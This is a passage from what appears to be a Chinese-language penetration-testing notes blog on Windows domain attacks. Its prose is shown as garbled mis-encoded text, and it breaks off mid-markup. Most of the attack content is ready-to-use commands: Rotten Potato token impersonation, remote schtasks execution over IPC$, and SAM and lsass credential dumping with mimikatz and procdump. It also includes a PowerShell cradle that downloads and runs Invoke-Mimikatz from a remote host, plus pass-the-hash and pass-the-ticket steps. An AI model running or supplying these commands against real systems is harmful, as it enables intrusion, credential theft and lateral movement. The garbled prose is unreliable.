å‡å†’ä»¤ç‰Œ</span><br></code></pre></td></tr></table></figure><p>å¦‚æœç³»ç»Ÿå­˜åœ¨æœ‰æ•ˆçš„ä»¤ç‰Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•é€šè¿‡Rotten Potatoç¨‹åºæ¥æ¨¡æ‹Ÿç”¨æˆ·ä»¤ç‰Œå®ç°æƒé™çš„æå‡</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><p>ä½¿ç”¨MSFæŸ¥è¯¢å¯ç”¨ä»¤ç‰Œ</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">use</span> <span class="hljs-string">incognito</span><br><span class="hljs-attr">list_tokens</span> <span class="hljs-string">-u</span><br></code></pre></td></tr></table></figure><p>å°†<code>rottenpotato.exe</code>ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä¸­</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">upload rottenpotato.exe <span class="hljs-comment"># MSFä¸Šä¼ </span><br>execute -HC -f rottenpotato.exe<br>impersonate_token ä»¤ç‰Œ <span class="hljs-comment"># å¯¼å…¥ä»¤ç‰Œ</span><br></code></pre></td></tr></table></figure><p>å­¦ä¹ æ–‡ç« </p><p><a href="https://hackergu.com/powerup-stealtoken-rottenpotato/">https://hackergu.com/powerup-stealtoken-rottenpotato/</a></p><h5 id="æ— å‡­è¯æ¡ä»¶ä¸‹çš„æƒé™è·å–"><a href="#æ— å‡­è¯æ¡ä»¶ä¸‹çš„æƒé™è·å–" class="headerlink" title="æ— å‡­è¯æ¡ä»¶ä¸‹çš„æƒé™è·å–"></a>æ— å‡­è¯æ¡ä»¶ä¸‹çš„æƒé™è·å–</h5><p><strong>LLMNRå’ŒNetBIOSæ¬ºéª—æ”»å‡»</strong></p><p>LLMNRï¼ˆæœ¬åœ°é“¾è·¯å¤šæ’­åç§°è§£æï¼‰æ˜¯ä¸€ç§åŸŸåç³»ç»Ÿæ•°æ®åŒ…æ ¼å¼ã€‚å½“å±€åŸŸç½‘ä¸­çš„DNSæœåŠ¡å™¨ä¸å¯ç”¨æ—¶ï¼ŒDNSå®¢æˆ·ç«¯ä¼šä½¿ç”¨LLMNRè§£ææœ¬åœ°ç½‘æ®µä¸­æœºå™¨çš„åç§°ï¼ŒæŒ‡å¯¼DNSå›å¤æ­£å¸¸ä¸ºæ­¢ã€‚LLMNRæ”¯æŒIPv6</p><p>NetBIOSæ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œæ ¹æ®NetBIOSåè®®å¹¿æ’­è·å¾—è®¡ç®—æœºåç§°ï¼Œå¹¶å°†å…¶è§£æä¸ºç›¸åº”çš„IPåœ°å€ï¼ŒNetBIOSä¸æ”¯æŒIPv6</p><p>Net-NTLM Hash ä¸ NTLM Hashä¸åŒ</p><p>NTLM Hash æ˜¯æŒ‡Windowsæ“ä½œç³»ç»Ÿçš„Security Account Managerä¸­ä¿å­˜çš„ç”¨æˆ·å¯†ç æ•£åˆ—å€¼ã€‚NTLM Hashé€šå¸¸ä¿å­˜åœ¨windowsä¸­çš„SAMæ–‡ä»¶æˆ–è€…ntds.ditæ•°æ®åº“ä¸­ï¼Œç”¨æˆ·å¯¹è®¿é—®èµ„æºçš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯</p><p>Net-NTLM Hash æ˜¯æŒ‡åœ¨ç½‘ç»œç¯å¢ƒä¸­ç»è¿‡NTLMè®¤è¯çš„æ•£åˆ—å€¼ã€‚æŒ‘æˆ˜/å“åº”éªŒè¯ä¸­çš„å“åº”å°±åŒ…å«äº†Net-NTLM Hashï¼Œä½¿ç”¨ResponderæŠ“å–çš„é€šå¸¸å°±æ˜¯Net-NTLM Hashï¼Œæ”»å‡»è€…æ— æ³•ä½¿ç”¨è¯¥æ•£åˆ—å€¼è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œåªèƒ½ä½¿ç”¨Hashcatç­‰å·¥å…·è·å¾—æ˜æ–‡åè¿›è¡Œæ¨ªå‘ç§»åŠ¨</p><p>æ”»å‡»å·¥å…·å¯ä»¥ä½¿ç”¨<code>Responder</code></p><h4 id="æ¨ªå‘æ¸—é€"><a href="#æ¨ªå‘æ¸—é€" class="headerlink" title="æ¨ªå‘æ¸—é€"></a>æ¨ªå‘æ¸—é€</h4><h5 id="Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤"><a href="#Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤" class="headerlink" title="Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤"></a>Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤</h5><p><strong>IPC</strong></p><p>IPCå…±äº«â€œå‘½åç®¡é“â€çš„èµ„æºï¼Œä¸ºäº†å®ç°è¿œç¨‹è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ã€‚IPCå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å¾—ç›¸åº”çš„æƒé™ï¼Œé€šå¸¸åœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ã€‚</p><p>é€šè¿‡<code>ipc$</code>å¯ä»¥ä¸ç›®æ ‡æœºå™¨å»ºç«‹è¿æ¥ï¼Œåˆ©ç”¨è¿™ä¸ªè¿æ¥å¯ä»¥è®¿é—®ç›®æ ‡æœºå™¨ä¸­çš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸Šä¼ ä¸‹è½½æ“ä½œå’Œè¿è¡Œå…¶ä»–å‘½ä»¤</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">å»ºç«‹ä¸€ä¸ªipc$<br>net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">17.18</span>\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&quot;password&quot;</span> /<span class="hljs-symbol">user:</span>administrator<br>æŸ¥çœ‹å·²ç»å»ºç«‹çš„è¿æ¥<br>net <span class="hljs-keyword">use</span><br></code></pre></td></tr></table></figure><p><code>ipc$</code><strong>åˆ©ç”¨æ¡ä»¶</strong></p><ul><li><p>å¼€å¯äº†139ã€445ç«¯å£</p></li><li><p>ç®¡ç†å‘˜å¼€å¯äº†é»˜è®¤å…±äº«</p><p>é»˜è®¤å…±äº«æ˜¯ä¸ºäº†æ–¹ä¾¿ç®¡ç†å‘˜è¿›è¡Œè¿œç¨‹ç®¡ç†è€Œé»˜è®¤å¼€å¯çš„ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„é€»è¾‘ç›˜ï¼ˆc$ d$ e$ï¼‰å’Œç³»ç»Ÿç›®å½•winntæˆ–windowsï¼ˆadmin$ï¼‰ï¼Œé€šè¿‡<code>ipc$</code>ï¼Œå¯ä»¥å®ç°å¯¹è¿™äº›é»˜è®¤å…±äº«ç›®å½•çš„è®¿é—®</p></li></ul><p><code>ipc$</code><strong>è¿æ¥å¤±è´¥çš„åŸå› </strong></p><ul><li>ç”¨æˆ·åå’Œå¯†ç é”™è¯¯</li><li>æ²¡æœ‰æ‰“å¼€<code>ipc$</code>é»˜è®¤å…±äº«</li><li>ä¸èƒ½æˆåŠŸè¿æ¥ç›®æ ‡çš„139å’Œ445ç«¯å£</li><li>å‘½ä»¤è¾“å…¥é”™è¯¯</li></ul><p><strong>å¸¸è§çš„é”™è¯¯å·</strong></p><ul><li>é”™è¯¯å· 5ï¼šæ‹’ç»è®¿é—®</li><li>é”™è¯¯å·51ï¼šæ— æ³•æ‰¾åˆ°ç½‘ç»œè·¯å¾„ï¼Œç½‘ç»œä¸­å­˜åœ¨é—®é¢˜</li><li>é”™è¯¯å·53ï¼šæ‰¾ä¸åˆ°ç½‘ç»œè·¯å¾„ï¼ŒåŒ…æ‹¬IPåœ°å€é”™è¯¯ï¼Œç›®æ ‡æœªå¼€æœºï¼Œç›®æ ‡çš„<code>lanmanserver</code>æœåŠ¡æœªå¯åŠ¨ï¼Œç›®æ ‡æœ‰é˜²æŠ¤å¢™ï¼ˆç«¯å£è¿‡æ»¤ï¼‰</li><li>é”™è¯¯å·67ï¼šæ‰¾ä¸åˆ°ç½‘ç»œåï¼ŒåŒ…æ‹¬<code>lanmanserver</code>æœåŠ¡æœªå¯åŠ¨ï¼Œ<code>ipc$</code>å·²è¢«åˆ é™¤</li><li>é”™è¯¯å·1219ï¼šæä¾›çš„å‡­æ®ä¸å·²å­˜åœ¨çš„å‡­æ®é›†å†²çªï¼Œä¾‹å¦‚å·²ç»å’Œç›®æ ‡å»ºç«‹<code>ipc$</code>ï¼Œéœ€è¦åœ¨é”™è¯¯åŸé“¾æ¥åé‡æ–°è¿›è¡Œè¿æ¥</li><li>é”™è¯¯å·1326ï¼šæœªçŸ¥çš„ç”¨æˆ·åå’Œå¯†ç </li><li>é”™è¯¯å·1792ï¼šè¯•å›¾ç™»å½•ï¼Œä½†æ˜¯ç½‘ç»œç™»å½•æœåŠ¡æ²¡æœ‰å¯åŠ¨</li><li>é”™è¯¯å·2242ï¼šç”¨æˆ·å¯†ç å·²ç»è¿‡æœŸ</li></ul><p><strong>windowsè‡ªå¸¦å·¥å…·è·å–è¿œç¨‹ä¸»æœºä¿¡æ¯</strong></p><ol><li><p><code>dir</code>å‘½ä»¤</p><p>ä½¿ç”¨<code>net use</code>å‘½ä»¤ä¸è¿œç¨‹ç›®æ ‡æœºå™¨å»ºç«‹<code>ipc$</code>åï¼Œå¯ä»¥ä½¿ç”¨<code>dir</code>åˆ—å‡ºè¿œç¨‹ä¸»æœºçš„æ–‡ä»¶</p></li><li><p><code>tasklist</code></p><p>ä½¿ç”¨<code>net use</code>å‘½ä»¤ä¸è¿œç¨‹ç›®æ ‡æœºå™¨å»ºç«‹<code>ipc$</code>åï¼Œå¯ä»¥ä½¿ç”¨<code>tasklist</code>å‘½ä»¤çš„<code>/S /U /P</code>å‚æ•°åˆ—å‡ºè¿œç¨‹ä¸»æœºä¸Šè¿è¡Œçš„è¿›ç¨‹</p></li></ol><p><strong>è®¡åˆ’ä»»åŠ¡</strong></p><ol><li><p><code>at</code>å‘½ä»¤</p><blockquote><p>at æ˜¯windowsè‡ªå¸¦çš„åˆ›å»ºè®¡åˆ’ä»»åŠ¡çš„å‘½ä»¤ï¼Œä¸»è¦å·¥ä½œåœ¨Windows server 2008 ä¹‹å‰çš„ç‰ˆæœ¬</p></blockquote><p>ä½¿ç”¨<code>at</code>å‘½ä»¤åœ¨è¿œç¨‹ç›®æ ‡æœºå™¨ä¸Šé¢åˆ›å»ºè®¡åˆ’ä»»åŠ¡æµç¨‹</p><ol><li><p>ä½¿ç”¨<code>net time</code>å‘½ä»¤ç¡®å®šè¿œç¨‹æœºå™¨å½“å‰çš„ç³»ç»Ÿæ—¶é—´</p><p><code>net time \\192.168.1.17</code></p></li><li><p>å°†æ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡ç³»ç»Ÿ</p><p><code>copy calc.bat \\192.168.1.17\C$</code></p></li><li><p>ä½¿ç”¨<code>at</code>åˆ›å»ºè®¡åˆ’ä»»åŠ¡</p><p><code>at \\192.168.1.17 4:11PM C:\cacl.bat</code></p><p>åˆ›å»ºä¸€ä¸ªè®¡åˆ’ä»»åŠ¡ï¼Œå†…å®¹æ˜¯ä¸‹åˆ4ï¼š11è¿è¡ŒCç›˜ ä¸‹çš„<code>cacl.bat</code></p></li><li><p>æ¸…æ¥š<code>at</code>è®°å½•</p><p><code>at \\192.168.1.17 jobID /delete</code></p></li></ol></li><li><p><code>schtasks</code>å‘½ä»¤</p><blockquote><p>Windows Vistã€Windows Server  2008åŠä¹‹åçš„ç‰ˆæœ¬å°†atå‘½ä»¤åºŸå¼ƒäº†ï¼Œæ”»å‡»è€…å°±ç”¨schtaskså‘½ä»¤ä»£æ›¿</p></blockquote><p>åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªåç§°ä¸º<code>test</code>çš„è®¡åˆ’ä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡åœ¨å¼€æœºæ—¶å¯åŠ¨Cç›˜ä¸‹çš„<code>cacl.bat</code>æƒé™ä¸ºsystem</p><p><code>schtasks /create /s 192.168.1.17 /tn teat /sc onstart /tr c:\cacl.bat /ru system /f</code></p><p>åœ¨è¿œç¨‹ä¸»æœºä¸Šè¿è¡Œè®¡åˆ’ä»»åŠ¡<code>test</code></p><p><code>schtasks /run /s 192.168.1.17 /i /tn &quot;test&quot;</code></p><blockquote><p>åœ¨ä½¿ç”¨schtaskså‘½ä»¤çš„æ—¶å€™ä¸ç”¨è¾“å…¥å¯†ç ï¼Œå› ä¸ºä¹‹å‰ä¸ç›®æ ‡ æœºå™¨å·²ç»å»ºç«‹äº†ipc$è¿æ¥ï¼Œå¦‚æœæ²¡æœ‰å»ºç«‹è¿æ¥å¯ä»¥åœ¨æ‰§è¡Œçš„æ—¶å€™è‡ªå·±æ·»åŠ /u /på‚æ•°</p></blockquote><p>åˆ é™¤è®¡åˆ’ä»»åŠ¡</p><p><code>schtasks /delete /s 192.168.1.17 /tn &quot;test&quot; /f</code></p><blockquote><p>schtaskså‘½ä»¤æ‰§è¡Œåä¼šåœ¨ç³»ç»Ÿä¸­ç•™ä¸‹æ—¥å¿—æ–‡ä»¶C:\Windows\Tasks\SchedLgU.txtï¼Œå¦‚æœæ‰§è¡Œå‘½ä»¤åæ²¡æœ‰å›æ˜¾å¯ä»¥é…åˆipc$æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨typeå‘½ä»¤è¿œç¨‹æŸ¥çœ‹æ‰§è¡Œç»“æœ</p></blockquote><p>åˆ é™¤<code>ipc$</code></p><p><code>net use åç§° /del /y</code></p></li></ol><h5 id="æ•£åˆ—å€¼è·å–åˆ†æ"><a href="#æ•£åˆ—å€¼è·å–åˆ†æ" class="headerlink" title="æ•£åˆ—å€¼è·å–åˆ†æ"></a>æ•£åˆ—å€¼è·å–åˆ†æ</h5><p><strong>LM Hash å’Œ NTLM Hash</strong></p><p>windowsé€šå¸¸ä½¿ç”¨ä¸¤ç§æ–¹æ³•å¯¹ç”¨æˆ·çš„å¯†ç è¿›è¡ŒåŠ å¯†å¤„ç†ï¼ŒåŸŸç¯å¢ƒä¸­ç”¨æˆ·çš„ä¿¡æ¯ å­˜å‚¨åœ¨<code>ntds.dit</code>ä¸­ï¼ŒåŠ å¯†åä¸ºæ•£åˆ—å€¼ï¼Œä»Windows Vista å’ŒWindows Server 2008ç‰ˆæœ¬å¼€å§‹ï¼ŒWindows å°±é»˜è®¤ç¦ç”¨äº†LM Hashã€‚NTLM Hashæ˜¯å¾®è½¯ä¸ºäº†æé«˜å®‰å…¨æ€§çš„åŒæ—¶ä¿è¯å…¼å®¹æ€§è€Œè®¾è®¡çš„æ•£åˆ—åŠ å¯†ç®—æ³•ï¼ŒNTLM Hashæ˜¯åŸºäºMD4 åŠ å¯†ç®—æ³•åŠ å¯†çš„ã€‚</p><p><strong>å•æœºå¯†ç æŠ“å–ä¸é˜²èŒƒ</strong></p><blockquote><p>æƒ³è¦åœ¨Windowsä¸­æŠ“å–æ•£åˆ—å€¼å’Œæ˜æ–‡å¯†ç ï¼Œå¿…é¡»å°†æƒé™æå‡åˆ°Systemã€‚æœ¬åœ°ç”¨æˆ·åã€æ•£åˆ—å€¼å’Œå…¶ä»–å®‰å…¨éªŒè¯ä¿¡æ¯éƒ½ä¿å­˜åœ¨SAMæ–‡ä»¶ä¸­ã€‚lsass.exe è¿›ç¨‹ç”¨æˆ·Windowsçš„å®‰å…¨ç­–ç•¥ï¼ˆæœ¬åœ°å®‰å…¨ç­–ç•¥å’Œç™»å½•ç­–ç•¥ï¼‰ã€‚</p><p>SAMæ–‡ä»¶ä¿å­˜çš„ä½ç½® åœ¨C:\Windows\System32\configä¸­</p></blockquote><p>ä¸‹é¢æ˜¯å¸¸è§çš„å•æœºå¯†ç æŠ“å–å·¥å…·</p><ol><li><p><code>GetPass</code></p><p>ç›´æ¥è¿è¡Œå³å¯è·å–å¯†ç </p></li><li><p><code>PwDump7</code></p><p>ç›´æ¥è¿è¡Œå³å¯</p></li><li><p><code>QuarksPwDump</code></p><p>è¿è¡Œ<code>QuarksPwDump.exe --dump-hash-local</code>å°±å¯ä»¥å¯¼å‡ºç”¨æˆ·çš„NTLM Hash</p><p>å®ƒå·²ç»è¢«å¤§å¤šæ•°æ€è½¯æ ‡è®°ä¸ºæ¶æ„è½¯ä»¶</p></li><li><p>é€šè¿‡SAMå’ŒSystemæ–‡ä»¶æŠ“å–å¯†ç </p><ol><li><p>åˆ°å¤„SAMæ–‡ä»¶å’ŒSystemæ–‡ä»¶</p><p><code>reg save hklm\sam sam.hive</code></p><p><code>reg save hklm\system system.hive</code></p></li><li><p>è¯»å–æ–‡ä»¶è·å¾—NTLM Hash</p><ul><li><p>ä½¿ç”¨<code>mimikatz</code>è¯»å–æ–‡ä»¶</p><blockquote><p>mimikatzæ˜¯ç”±æ³•å›½çš„æŠ€æœ¯é«˜æ‰‹ä½¿ç”¨cè¯­è¨€å†™çš„ç³»ç»Ÿè°ƒè¯•å·¥å…·ï¼Œå¯ä»¥ä»å†…å­˜ä¸­æå–æ˜æ–‡å¯†ç ã€æ•£åˆ—å€¼ã€PINå’ŒKerberosç¥¨æ®ï¼Œå®ƒä¹Ÿå¯ä»¥æ‰§è¡Œå“ˆå¸Œä¼ é€’ï¼Œç¥¨æ®ä¼ é€’æˆ–è€…æ„å»ºé»„é‡‘ç¥¨æ®</p></blockquote><p>å°†<code>sam.hive</code> <code>system.hive</code>æ–‡ä»¶æ”¾åˆ°mimikatzçš„åŒä¸€ä¸ªç›®å½•ä¸‹é¢</p><p><code>lsadump::sam/sam:sam.hive /system:system.hive</code></p></li><li><p>ä½¿ç”¨Cainè¯»å–</p></li><li><p>ä½¿ç”¨<code>mimikatz</code>ç›´æ¥è¯»å–</p><blockquote><p>ç›´æ¥åœ¨ç›®æ ‡æœºå™¨ä¸Šé¢è¿è¡Œ</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug æå‡æƒé™<br>token::elevate å°†æƒé™æå‡åˆ°system<br>lsadump::sam è¯»å–æœ¬åœ°çš„SAMæ–‡ä»¶ï¼Œè·å–NTLM Hash<br></code></pre></td></tr></table></figure></li></ul></li></ol></li></ol><ol start="5"><li><p><code>mimikatz</code>åœ¨çº¿è¯»å–SAM</p><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p></li><li><p><code>mimikatz</code>ç¦»çº¿è¯»å–<code>lsass.dmp</code>æ–‡ä»¶</p><ol><li><p>å¯¼å‡º<code>lsass.dmp</code>æ–‡ä»¶</p><ul><li><p>ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨å¯¼å‡º</p><p>åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­æ‰¾åˆ°<code>lsass.dmp</code>æ–‡ä»¶ï¼Œå³é”®é€‰æ‹©â€Create Dump Fileâ€</p></li><li><p>ä½¿ç”¨<code>procdump</code>å¯¼å‡º</p><blockquote><p>è¿™ä¸ªæ˜¯å¾®è½¯å‘å¸ƒçš„å·¥å…·æ‰€ä»¥ä¸ä¼šè¢«æ€è½¯æŸ¥æ€</p></blockquote><p><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code> </p></li></ul></li><li><p>ä½¿ç”¨<code>mimikatz</code>è·å–</p><p>å…ˆåœ¨å‘½ä»¤ç¯å¢ƒè¿è¡Œ<code>mimikatz</code>ï¼Œå°†<code>lsass.dmp</code>æ–‡ä»¶åŠ è½½åˆ°<code>mimikatz</code>å½“ä¸­ï¼Œè¾“å…¥å‘½ä»¤<code>sekurlsa::minidump lsass.DMP</code>ï¼Œå¦‚æœæ˜¾ç¤º<code>Switch to MINIDUMP</code>å°±è¡¨ç¤ºæˆåŠŸï¼Œæœ€åè¾“å…¥<code>sekurlsa::logonPasswords full</code> å‘½ä»¤å¯¼å‡ºæ•£åˆ—å€¼</p></li></ol></li><li><p>ä½¿ç”¨<code>Powershell</code>å¯¹æ•£åˆ—å€¼è¿›è¡ŒDumpæ“ä½œ</p><p>è¿›å…¥Nishangç›®å½•ï¼Œå°†Get-PassHashes.ps1è„šæœ¬å¯¼å…¥</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-keyword">Import</span>-M,odule .\<span class="hljs-keyword">Get</span>-PassHashes.ps1<br><span class="hljs-keyword">Get</span>-PassHashes<br></code></pre></td></tr></table></figure></li><li><p><code>Powershell</code>è¿œç¨‹åŠ è½½<code>mimikatz</code></p><p><code>powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.101/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz</code></p><p><a href="https://www.freebuf.com/articles/web/176796.html">ä¹ç§å§¿åŠ¿è¿è¡ŒMimikatz </a></p></li></ol><p><strong>ä½¿ç”¨Hashcatè·å–å¯†ç </strong></p><p>è¿™æ˜¯ä¸€ä¸ªå¯†ç ç ´è§£è½¯ä»¶ï¼Œkaliè‡ªå¸¦äº†ï¼Œå…·ä½“ä½¿ç”¨å¯ä»¥æŸ¥çœ‹å®ƒæä¾›çš„å¸®åŠ©</p><h5 id="å“ˆå¸Œä¼ é€’æ”»å‡»-PTH"><a href="#å“ˆå¸Œä¼ é€’æ”»å‡»-PTH" class="headerlink" title="å“ˆå¸Œä¼ é€’æ”»å‡»(PTH)"></a>å“ˆå¸Œä¼ é€’æ”»å‡»(PTH)</h5><p>å¦‚æœè®¡ç®—æœºæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·å’Œå¯†ç ä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»çš„æ–¹æ³•ç™»å½•å†…ç½‘ä¸­çš„å…¶ä»–è®¡ç®—æœº</p><p><strong>ä½¿ç”¨NTLM Hashè¿›è¡Œå“ˆå¸Œä¼ é€’</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">mimikatz.exe<br><span class="hljs-attr">privilege:</span>:debug<br><span class="hljs-attr">sekurlsa:</span>:path <span class="hljs-regexp">/user:administrator /</span><span class="hljs-attr">domain:</span>lcdm123.com /<span class="hljs-attr">ntlm:</span>NTLM Hash<br></code></pre></td></tr></table></figure><p>åˆ—å‡ºè¿œç¨‹ä¸»æœºCç›˜çš„å†…å®¹</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">dir <span class="hljs-tag">\<span class="hljs-name">\</span></span>ä¸»æœºå<span class="hljs-tag">\<span class="hljs-name">C</span></span><span class="hljs-formula">$</span><br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨AES-256å¯†é’¥è¿›è¡Œå“ˆå¸Œä¼ é€’</strong></p><blockquote><p>è¿œç¨‹ç³»ç»Ÿå¿…é¡»å®‰è£… KB2871997</p></blockquote><p>ä½¿ç”¨<code>mimikatz</code>æŠ“å–å¯†é’¥</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">mimikatz</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">privilege</span><span class="hljs-selector-pseudo">::debug</span><br><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::ekeys</span><br></code></pre></td></tr></table></figure><p>ä»¥ç®¡ç†å‘˜å‘½ä»¤è¿è¡Œ<code>mimikatz</code></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">mimikatz.exe<br><span class="hljs-attr">privilege:</span>:debug<br><span class="hljs-attr">sekurlsa:</span>:path <span class="hljs-regexp">/user:administrator /</span><span class="hljs-attr">domain:</span>lcdm123.com /<span class="hljs-attr">aes256:</span>AES<span class="hljs-number">-256</span><br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong></p><ol><li><code>dir</code>åé¢è¦ä½¿ç”¨ä¸»æœºåï¼Œè€Œä¸æ˜¯IP</li><li>AES-128å¯†é’¥ä¹Ÿå¯ä»¥ç”¨æ¥Hashä¼ é€’</li><li>ä½¿ç”¨AESå¯†é’¥å¯¹è¿œç¨‹ä¸»æœºè¿›è¡Œå“ˆå¸Œä¼ é€’çš„å‰ææ˜¯å®‰è£…KB2871997</li><li>å®‰è£…äº†KB2871997åä»ç„¶å¯ä»¥ä½¿ç”¨SIDä¸º500çš„ç”¨æˆ·çš„NTLM Hashè¿›è¡Œå“ˆå¸Œä¼ é€’</li><li>è¦ä½¿ç”¨<code>mimikatz</code>çš„å“ˆå¸Œä¼ é€’åŠŸèƒ½ï¼Œéœ€è¦å…·æœ‰æœ¬åœ°ç®¡ç†å‘˜çš„æƒé™</li></ol><blockquote><p>KB2871997é€šè¿‡ç¦æ­¢æœ¬åœ°ç®¡ç†å‘˜æƒé™ä¸è¿œç¨‹è®¡ç®—æœºè¿›è¡Œè¿æ¥ï¼Œæ— æ³•é€šè¿‡æœ¬åœ°ç®¡ç†å‘˜æƒé™å¯¹è¿œç¨‹è®¡ç®—æœºä½¿ç”¨PsExecï¼ŒWMIï¼Œsmbexecï¼Œschtasksï¼Œatï¼Œä¹Ÿæ— æ³•è®¿é—®è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶å…±äº«ã€‚ä½†æ˜¯å¯¹äºAdministratorï¼ˆSIDä¸º500ï¼‰çš„è´¦æˆ·ä¾ç„¶å¯ä»¥è¿›è¡Œå“ˆå¸Œä¼ é€’</p></blockquote><h5 id="ç¥¨æ®ä¼ é€’æ”»å‡»"><a href="#ç¥¨æ®ä¼ é€’æ”»å‡»" class="headerlink" title="ç¥¨æ®ä¼ é€’æ”»å‡»"></a>ç¥¨æ®ä¼ é€’æ”»å‡»</h5><ol><li><p>ä½¿ç”¨<code>mimikatz</code>è¿›è¡Œç¥¨æ®ä¼ é€’</p><p>å¯¼å‡ºå†…å­˜ä¸­çš„ç¥¨æ®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz.exe<br>privilege::debug<br>sekurlsa::tickets /<span class="hljs-keyword">export</span><br>æ‰§è¡Œå‘½ä»¤åï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸­å‡ºç°å¤šä¸ªæœåŠ¡çš„ç¥¨æ®æ–‡ä»¶<br><br>kerberos::purge  æ¸…é™¤å†…å­˜ä¸­çš„ç¥¨æ®<br><br>kerberos::ptt PATH  æ³¨å…¥ç¥¨æ®<br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨<code>kekeo</code>è¿›è¡Œç¥¨æ®ä¼ é€’</p><p>å·¥å…·ä¸‹è½½ï¼š<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p><code>kekeo</code>éœ€è¦åŸŸåï¼Œç”¨æˆ·åï¼ŒNTLM Hashä¸‰è€…é…åˆç”Ÿæˆç¥¨æ®ï¼Œå†å°†ç¥¨æ®å¯¼å…¥</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less">ç”Ÿæˆç¥¨æ®<br><span class="hljs-selector-tag">kekeo</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">tgt</span><span class="hljs-selector-pseudo">::ask</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:administrator</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:lcdm123.com</span> /<span class="hljs-selector-tag">ntlm</span><span class="hljs-selector-pseudo">:NTLM</span> <span class="hljs-selector-tag">Hash</span><br>æ¸…é™¤ç¥¨æ®<br><span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::purge</span> # <span class="hljs-selector-tag">kekeo</span>çš„å‘½ä»¤<br><span class="hljs-selector-tag">klist</span> <span class="hljs-selector-tag">purge</span> # <span class="hljs-selector-tag">Windows</span>è‡ªå¸¦çš„å‘½ä»¤<br>å¯¼å…¥ç¥¨æ®<br><span class="hljs-selector-tag">kerberos</span><span 